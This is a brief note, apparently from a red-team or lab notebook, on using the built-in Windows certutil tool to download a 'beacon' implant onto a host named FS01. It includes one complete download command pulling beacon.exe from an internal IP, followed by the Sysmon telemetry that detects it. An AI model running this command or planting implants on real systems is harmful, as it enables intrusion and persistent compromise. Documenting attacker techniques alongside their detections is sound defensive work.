# certutil

Built into Windows. Used to download the beacon onto FS01 when SMB upload is not convenient.

```
certutil -urlcache -split -f http://192.168.50.100/beacon.exe C:\ProgramData\beacon.exe
```

Telemetry: Sysmon 1 with `certutil` and an `http` URL; Sysmon 3 if network events are collected.
